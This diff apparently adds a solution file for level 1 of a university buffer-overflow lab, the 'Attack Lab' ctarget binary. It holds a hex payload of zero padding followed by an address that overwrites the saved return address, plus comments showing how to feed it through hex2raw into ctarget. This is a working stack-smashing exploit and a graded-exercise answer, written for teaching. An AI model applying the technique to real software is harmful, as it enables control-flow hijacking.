@@ -1,0 +1,15 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00  /* overrun Return Address of previous stack frame */
+
+/* 
+    Input Approch 1:
+        unix> cat Level_1.txt | ./hex2raw | ./ctarget -q
+
+    Input Approch 2:
+        unix> ./hex2raw < Level_1.txt > tmp
+        unix> ./ctarget -q -i tmp
+*/
